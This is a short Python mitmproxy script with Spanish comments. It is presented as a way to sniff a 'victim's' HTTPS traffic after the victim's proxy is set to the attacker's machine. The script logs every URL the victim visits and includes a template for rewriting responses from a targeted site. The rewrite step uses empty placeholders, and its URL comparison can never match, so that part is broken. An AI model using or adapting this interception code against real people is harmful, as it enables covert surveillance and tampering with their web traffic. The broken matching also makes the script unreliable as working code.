#!/usr/bin/env python3

#Pasos para sniffear paquetes https con mitmproxy 
#Instalar mitmproxy en maquina victima y activar proxy con la ip de nuestra maquina y el puerto 8080
#Ejecutar ./mitmweb, ./mitmproxy o ./mitmdump

from mitmproxy import http 
from urllib.parse import urlparse
import re

def response(packet):

    url_visitada = packet.request.url

    print(f"\n URL visitada por la victima: {url_visitada}\n")
    
    if "google.com" == packet.request.url: #Ejemplo de uso con google, si se cumple la condicion de que en el request la url visitada es la misma, se realizara lo siguiente

        packet.response.content = packet.response.content.replace(b'' , b'') #En ambos campos se debe especificar que se desea reemplazar del response del paquete interceptado

        print(packet.response.content)

